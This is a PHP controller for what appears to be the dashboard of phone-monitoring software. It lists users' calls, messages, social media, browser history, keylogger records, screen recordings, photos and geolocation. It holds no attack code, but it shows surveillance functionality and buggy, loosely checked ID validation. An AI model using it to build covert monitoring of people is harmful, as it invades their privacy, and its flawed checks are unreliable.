<?php

class User extends Affiliate_Controller {

    public function __construct() {
        parent::__construct();
        $this->load->library('Datatables');
        $this->load->model('datatable_model', 'datatable_model');
        $this->load->model('affiliate/user_model', 'this_model');
    }

    public function index() {

        $data['page'] = "affiliate/user/list";
        $data['userinfo'] = 'active open';
        $data['userinfo'] = 'active';
        $data['var_meta_title'] = 'User List';
        $data['var_meta_description'] = 'User List';
        $data['var_meta_keyword'] = 'User List';
        $data['css'] = array('page_level.css');
        $data['js'] = array('affiliate/user.js');
        $data['init'] = array('User.init()');

        $this->load->view(AFFILIATE_LAYOUT, $data);
    }
    
    public function add_user() {

        $data['page'] = "affiliate/user/add_user";
        $data['userinfo'] = 'active open';
        $data['userinfo'] = 'active';
        $data['var_meta_title'] = 'User Add';
        $data['var_meta_description'] = 'User Add';
        $data['var_meta_keyword'] = 'User Add';
        $data['css'] = array('page_level.css');
        $data['js'] = array('affiliate/user.js');
        $data['init'] = array('User.user_init()');
        
        if($this->input->post()){
            $result = $this->this_model->addUser($this->input->post());
            echo json_encode($result); exit();
        }
        
        $this->load->view(AFFILIATE_LAYOUT, $data);
    }
    
    public function handleMonitoringStatus(){
        if(($this->input->post()) && ($this->input->is_ajax_request())){
           $result = $this->this_model->handleMonitoringStatus($this->input->post());
            echo json_encode($result);
        }
    }
    
    public function handleAppStatus(){
        if(($this->input->post()) && ($this->input->is_ajax_request())){
           $result = $this->this_model->handleAppStatus($this->input->post());
            echo json_encode($result);
        }
    }

    /* User Overview */

    public function overview($id) {
        $ids = $this->utility->decode($id);
        if (!ctype_digit($ids)) {
            return FALSE;
        }

        $data['page'] = "affiliate/user/overview";
        $data['overview'] = 'active open';
        $data['overview'] = 'active';
        $data['var_meta_title'] = 'User Overview';
        $data['var_meta_description'] = 'User Overview';
        $data['var_meta_keyword'] = 'User Overview';
        $data['css'] = array('page_level.css');
        $data['js'] = array('affiliate/user.js');
        $data['init'] = array('User.overview(),User.geo_location()');
        $data['user_id'] = $id;
        $data['user_name'] = getUserName($ids);
        $data['chartData'] = $this->this_model->getChartData($ids);
        $data['getCallType'] = $this->this_model->getCallType($ids);
        $data['getMessageType'] = $this->this_model->getMessageType($ids);
        $data['getSocialype'] = $this->this_model->getSocialype($ids);
        $data['recentFeeds'] = $this->this_model->getRecentFeeds($ids);
        $data['geoLocation'] = TRUE;
        $data['getGeoLocation'] = $this->this_model->getGeoLocation($id);
        //echo "<pre/>"; print_r($data['recentFeeds']); exit();
        $this->load->view(AFFILIATE_LAYOUT, $data);
    }

    /* Users Application */

    public function application($id) {
        $ids = $this->utility->decode($id);
        if (!ctype_digit($ids)) {
            return FALSE;
        }

        $data['page'] = "affiliate/user/application";
        $data['application'] = 'active open';
        $data['application'] = 'active';
        $data['var_meta_title'] = 'User Application List';
        $data['var_meta_description'] = 'User Application List';
        $data['var_meta_keyword'] = 'User Application List';
        $data['css_plugin'] = array(
            'bootstrap-switch/css/bootstrap-switch.min.css'
        );
        $data['js_plugin'] = array(
            'bootstrap-switch/js/bootstrap-switch.min.js'
        );
        $data['css'] = array('page_level.css');
        $data['js'] = array('affiliate/user.js');
        $data['init'] = array('User.application()');
        $data['user_id'] = $id;
        $data['user_name'] = getUserName($ids);

        $this->load->view(AFFILIATE_LAYOUT, $data);
    }

    /* Handle application status */

    public function handleStatus() {
        if (($this->input->post()) && ($this->input->is_ajax_request())) {
            $result = $this->this_model->handleStatus($this->input->post());
            if ($result) {
                echo "success";
                exit();
            } else {
                echo "error";
                exit();
            }
        }
    }

    /* User Log */

    public function contact($id) {
        $ids = $this->utility->decode($id);
        if (!ctype_digit($ids)) {
            return FALSE;
        }

        $data['page'] = "affiliate/user/logs/contact_list";
        $data['logs'] = 'active open';
        $data['contact'] = 'active';
        $data['var_meta_title'] = 'Contact List';
        $data['var_meta_description'] = 'Contact List';
        $data['var_meta_keyword'] = 'Contact List';
        $data['css'] = array('page_level.css');
        $data['js'] = array('affiliate/user.js');
        $data['init'] = array('User.contact()');
        $data['user_id'] = $id;
        $data['user_name'] = getUserName($ids);

        $this->load->view(AFFILIATE_LAYOUT, $data);
    }

    public function call($id , $type = NULL) {
        
        $ids = $this->utility->decode($id);
        if (!ctype_digit($ids)) {
            return FALSE;
        }

        $data['page'] = "affiliate/user/logs/call_list";
        $data['logs'] = 'active open';
        $data['call'] = 'active';
        $data['var_meta_title'] = 'Call List';
        $data['var_meta_description'] = 'Call List';
        $data['var_meta_keyword'] = 'Call List';
        $data['css'] = array('page_level.css');
        $data['js'] = array('affiliate/user.js');
        $data['init'] = array('User.call()');
        $data['user_id'] = $id;
        $data['type'] = $type;
        $data['user_name'] = getUserName($ids);

        $this->load->view(AFFILIATE_LAYOUT, $data);
    }

    public function message($id ,$type = NULL) {
        $ids = $this->utility->decode($id);
        if (!ctype_digit($ids)) {
            return FALSE;
        }

        $data['page'] = "affiliate/user/logs/message_list";
        $data['logs'] = 'active open';
        $data['message'] = 'active';
        $data['var_meta_title'] = 'Message List';
        $data['var_meta_description'] = 'Message List';
        $data['var_meta_keyword'] = 'Message List';
        $data['css'] = array('page_level.css');
        $data['js'] = array('affiliate/user.js');
        $data['init'] = array('User.message()');
        $data['user_id'] = $id;
        $data['type'] = $type;
        $data['user_name'] = getUserName($ids);

        $this->load->view(AFFILIATE_LAYOUT, $data);
    }

    public function browser_history($id) {
        $ids = $this->utility->decode($id);
        if (!ctype_digit($ids)) {
            return FALSE;
        }

        $data['page'] = "affiliate/user/logs/browser_list";
        $data['logs'] = 'active open';
        $data['browser_histroy'] = 'active';
        $data['var_meta_title'] = 'Browser history List';
        $data['var_meta_description'] = 'Browser history List';
        $data['var_meta_keyword'] = 'Browser history List';
        $data['css'] = array('page_level.css');
        $data['js'] = array('affiliate/user.js');
        $data['init'] = array('User.browser_history()');
        $data['user_id'] = $id;
        $data['user_name'] = getUserName($ids);

        $this->load->view(AFFILIATE_LAYOUT, $data);
    }

    public function social_media($id , $type = NULL) {
        $ids = $this->utility->decode($id);
        if (!ctype_digit($ids)) {
            return FALSE;
        }

        $data['page'] = "affiliate/user/logs/social_media_list";
        $data['logs'] = 'active open';
        $data['socail_media'] = 'active';
        $data['var_meta_title'] = 'Social media List';
        $data['var_meta_description'] = 'Browser History List';
        $data['var_meta_keyword'] = 'Browser History List';
        $data['css'] = array('page_level.css');
        $data['js'] = array('affiliate/user.js');
        $data['init'] = array('User.social_media()');
        $data['user_id'] = $id;
        $data['type'] = $type;
        $data['user_name'] = getUserName($ids);

        $this->load->view(AFFILIATE_LAYOUT, $data);
    }

    public function key_logger($id) {
        $ids = $this->utility->decode($id);
        if (!ctype_digit($ids)) {
            return FALSE;
        }

        $data['page'] = "affiliate/user/logs/key_logger_list";
        $data['logs'] = 'active open';
        $data['key_logger'] = 'active';
        $data['var_meta_title'] = 'Key Logger List';
        $data['var_meta_description'] = 'Key Logger List';
        $data['var_meta_keyword'] = 'Key Logger List';
        $data['css'] = array('page_level.css');
        $data['js'] = array('affiliate/user.js');
        $data['init'] = array('User.key_looger()');
        $data['user_id'] = $id;
        $data['user_name'] = getUserName($ids);

        $this->load->view(AFFILIATE_LAYOUT, $data);
    }

    public function notification($id) {
        $ids = $this->utility->decode($id);
        if (!ctype_digit($ids)) {
            return FALSE;
        }

        $data['page'] = "affiliate/user/logs/notification_list";
        $data['logs'] = 'active open';
        $data['notification'] = 'active';
        $data['var_meta_title'] = 'Notification List';
        $data['var_meta_description'] = 'Notification List';
        $data['var_meta_keyword'] = 'Notification List';
        $data['css'] = array('page_level.css');
        $data['js'] = array('affiliate/user.js');
        $data['init'] = array('User.notification()');
        $data['user_id'] = $id;
        $data['user_name'] = getUserName($ids);

        $this->load->view(AFFILIATE_LAYOUT, $data);
    }

    public function gallery($id) {
        $ids = $this->utility->decode($id);
        if (!ctype_digit($ids)) {
            return FALSE;
        }

        $data['page'] = "affiliate/user/media/gallary";
        $data['gallary'] = 'active open';
        $data['gallary'] = 'active';
        $data['var_meta_title'] = 'Gallary List';
        $data['var_meta_description'] = 'Gallary List';
        $data['var_meta_keyword'] = 'Gallary List';
        $data['css'] = array('page_level.css');
        $data['js'] = array('affiliate/user.js');
        $data['init'] = array('User.gallary()');
        $data['user_id'] = $id;
        $data['gallaryData'] = $this->this_model->getGallaryData($ids, 'G');
        $getLast = end($data['gallaryData']);
        $data['last_id'] = $getLast->id;
        $data['user_name'] = getUserName($ids);

        $this->load->view(AFFILIATE_LAYOUT, $data);
    }

    public function handlePagination() {
        if (($this->input->post()) && ($this->input->is_ajax_request())) {

            $id = $this->utility->decode($this->input->post('id'));
            $type = $this->input->post('type');
            $paginationType = $this->input->post('pagination_type');
            $offset = $this->input->post('offset');
            $timeId = ($this->input->post('timeId') != '') ? $this->input->post('timeId') : NULL;

            if ($paginationType == 'pic') {

                $data['gallaryData'] = $this->this_model->getGallaryData($id, $type, $timeId, $offset);
                $last = end($data['gallaryData']);
                $data1['main'] = $this->load->view('affiliate/user/media/load_more_gallary', $data, true);
                $data1['lastId'] = $last->id;
            } else if ($paginationType == 'video') {
                $data['videoData'] = $this->this_model->getVideoData($id, $type, $timeId, $offset);
                $last = end($data['videoData']);
                $data1['main'] = $this->load->view('affiliate/user/media/load_more_video', $data, true);
                $data1['lastId'] = $last->id;
            }

            echo json_encode($data1);
            exit();
        }
    }

    public function video($id) {
        $ids = $this->utility->decode($id);
        if (!ctype_digit($ids)) {
            return FALSE;
        }

        $data['page'] = "affiliate/user/media/video";
        $data['video'] = 'active open';
        $data['video'] = 'active';
        $data['var_meta_title'] = 'Video List';
        $data['var_meta_description'] = 'Video List';
        $data['var_meta_keyword'] = 'Video List';
        $data['css'] = array('page_level.css');
        $data['js'] = array('affiliate/user.js');
        $data['init'] = array('User.video()');
        $data['user_id'] = $id;
        $data['user_name'] = getUserName($ids);

        $data['videoData'] = $this->this_model->getVideoData($ids, 'V');
        $getLast = end($data['videoData']);
        $data['last_id'] = $getLast->id;

        $this->load->view(AFFILIATE_LAYOUT, $data);
    }

    public function video_recording($id) {
        $ids = $this->utility->decode($id);
        if (!ctype_digit($ids)) {
            return FALSE;
        }

        $data['page'] = "affiliate/user/media/screen_video_timeing";
        $data['screen_video'] = 'active open';
        $data['screen_video'] = 'active';
        $data['var_meta_title'] = 'Screen video timeing List';
        $data['var_meta_description'] = 'Screen video timeing List';
        $data['var_meta_keyword'] = 'Screen video timeing List';
        $data['css_plugin'] = array(
            'bootstrap-datetimepicker/css/bootstrap-datetimepicker.min.css',
        );
        $data['css'] = array('page_level.css');
        $data['js'] = array('affiliate/user.js');
        $data['js_plugin'] = array(
            'bootstrap-datetimepicker/js/bootstrap-datetimepicker.min.js',
            'moment.min.js'
        );
        $data['init'] = array('User.screen_video_time()');
        $data['formAction'] = affiliate_url().'user/video_recording/'.$id;
        $data['user_id'] = $id;
        $data['user_name'] = getUserName($ids);
        $data['videoData'] = $this->this_model->getVideoData($ids, 'VS');
        $getLast = end($data['videoData']);
        $data['last_id'] = $getLast->id;

        if (($this->input->post()) && ($this->input->is_ajax_request())) {
            $result = $this->this_model->setVideoTimeingSetting($this->input->post());
            echo json_encode($result); exit();
        }

        $this->load->view(AFFILIATE_LAYOUT, $data);
    }

    public function screen_video_timeing($id, $timeId) {
        $ids = $this->utility->decode($id);
        $timeId = $this->utility->decode($timeId);
        
        if (!ctype_digit($ids) && !ctype_digit($timeId)) {
            return FALSE;
        }

        $data['page'] = "affiliate/user/media/screen_video";
        $data['screen_video'] = 'active open';
        $data['screen_video'] = 'active';
        $data['var_meta_title'] = 'Screen video List';
        $data['var_meta_description'] = 'Screen video List';
        $data['var_meta_keyword'] = 'Screen video List';
        $data['css'] = array('page_level.css');
        $data['js'] = array('affiliate/user.js');
        $data['init'] = array('User.video_screen()');
        $data['user_id'] = $id;
        $data['user_name'] = getUserName($ids);

        $data['videoData'] = $this->this_model->getVideoData($ids, 'VS', $timeId);
        $getLast = end($data['videoData']);
        $data['last_id'] = $getLast->id;

        $this->load->view(AFFILIATE_LAYOUT, $data);
    }

    public function snapshots($id) {
        $ids = $this->utility->decode($id);

        if (!ctype_digit($ids)) {
            return FALSE;
        }

        $data['page'] = "affiliate/user/media/screen_photo_timeing";
        $data['screen_photo'] = 'active open';
        $data['screen_photo'] = 'active';
        $data['var_meta_title'] = 'Screen photo timeing List';
        $data['var_meta_description'] = 'Screen photo timeing List';
        $data['var_meta_keyword'] = 'Screen photo timeing List';
        $data['css_plugin'] = array(
            'bootstrap-datetimepicker/css/bootstrap-datetimepicker.min.css',
        );
        $data['js_plugin'] = array(
           'bootstrap-datetimepicker/js/bootstrap-datetimepicker.min.js',
           'moment.min.js'
        );
        $data['css'] = array('page_level.css');
        $data['js'] = array('affiliate/user.js');
        $data['init'] = array('User.screen_pic_time()');
        $data['user_id'] = $id;
        $data['formAction'] = affiliate_url().'user/snapshots/'.$id;
        $data['gallaryData'] = $this->this_model->getGallaryData($ids, 'SP');
        $getLast = end($data['videoData']);
        $data['last_id'] = $getLast->id;
        $data['user_name'] = getUserName($ids);
        
        if (($this->input->post()) && ($this->input->is_ajax_request())) {
            $result = $this->this_model->setScreenPicTimeingSetting($this->input->post());
            echo json_encode($result); exit();
        }

        $this->load->view(AFFILIATE_LAYOUT, $data);
    }

    public function screen_pic_view($id, $timeId) {
        $ids = $this->utility->decode($id);
        $timeId = $this->utility->decode($timeId);

        if (!ctype_digit($ids) && !ctype_digit($timeId)) {
            return FALSE;
        }

        $data['page'] = "affiliate/user/media/screen_photo";
        $data['screen_photo'] = 'active open';
        $data['screen_photo'] = 'active';
        $data['var_meta_title'] = 'Screen photo List';
        $data['var_meta_description'] = 'Screen photo List';
        $data['var_meta_keyword'] = 'Screen photo List';
        $data['css'] = array('page_level.css');
        $data['js'] = array('affiliate/user.js');
        $data['init'] = array('User.screen_pic()');
        $data['user_id'] = $id;
        $data['user_name'] = getUserName($ids);

        $data['gallaryData'] = $this->this_model->getGallaryData($ids, 'SP', $timeId);
        $getLast = end($data['videoData']);
        $data['last_id'] = $getLast->id;

        $this->load->view(AFFILIATE_LAYOUT, $data);
    }

    public function geo_location($id) {
        $ids = $this->utility->decode($id);
        if (!ctype_digit($ids)) {
            return FALSE;
        }
        
        $data['page'] = "affiliate/user/geo_location";
        $data['geo_location'] = 'active open';
        $data['geo_location'] = 'active';
        $data['var_meta_title'] = 'Geo location';
        $data['var_meta_description'] = 'Geo location';
        $data['var_meta_keyword'] = 'Geo location';
        $data['css'] = array('page_level.css');
        $data['js'] = array('affiliate/user.js');
        $data['init'] = array('User.geo_location()');
        $data['user_id'] = $id;
        $data['user_name'] = getUserName($ids);
        $data['geoLocation'] = TRUE;
        $data['getGeoLocation'] = $this->this_model->getGeoLocation($id);
        
        $this->load->view(AFFILIATE_LAYOUT, $data);
    }

    /*
     * handle User wise logs & User Datatable
     */
    
    
    /*Handle Picture Status*/
    
    public function picture_status(){
        if (($this->input->post()) && ($this->input->is_ajax_request())) {
            $result = $this->this_model->handlePicStatus($this->input->post());
            if($result){
                echo "success"; exit();
            }else{
                echo "error"; exit();
            }
        }
    }
    
    /*Handle Video Status*/
    
    public function video_status(){
        if (($this->input->post()) && ($this->input->is_ajax_request())) {
            $result = $this->this_model->handleVideoStatus($this->input->post());
            if($result){
                echo "success"; exit();
            }else{
                echo "error"; exit();
            }
        }
    }

    public function manageUser() {
        $result = $this->datatable_model->getUserDatatable();
        echo json_encode($result);
        exit();
    }

    public function manageContact($id) {
        $result = $this->datatable_model->getContactDatatable($id);
        echo json_encode($result);
        exit();
    }

    public function manageCall($id, $value) {
        $result = $this->datatable_model->getCallDatatable($id, $value);
        echo json_encode($result);
        exit();
    }

    public function manageMessage($id, $value) {
        $result = $this->datatable_model->getMessageDatatable($id, $value);
        echo json_encode($result);
        exit();
    }

    public function manageKeyLogger($id) {
        $result = $this->datatable_model->getKeyLoggerDatatable($id);
        echo json_encode($result);
        exit();
    }

    public function manageSocialMedia($id, $value) {
        $result = $this->datatable_model->getSocialMediaDatatable($id, $value);
        echo json_encode($result);
        exit();
    }

    public function manageBrowserHistory($id) {
        $result = $this->datatable_model->getBrowserHistoryDatatable($id);
        echo json_encode($result);
        exit();
    }

    public function manageNotification($id) {
        $result = $this->datatable_model->getNotificationDatatable($id);
        echo json_encode($result);
        exit();
    }

    public function manageApplication($id) {
        $result = $this->datatable_model->getApplicationDatatable($id);
        echo json_encode($result);
        exit();
    }

    public function manageScreenPicTime($id) {
        $result = $this->datatable_model->getScreenPicTimeDatatable($id);
        echo json_encode($result);
        exit();
    }

    public function manageVideoTime($id) {
        $result = $this->datatable_model->getVideoTimeDatatable($id);
        echo json_encode($result);
        exit();
    }

}

?>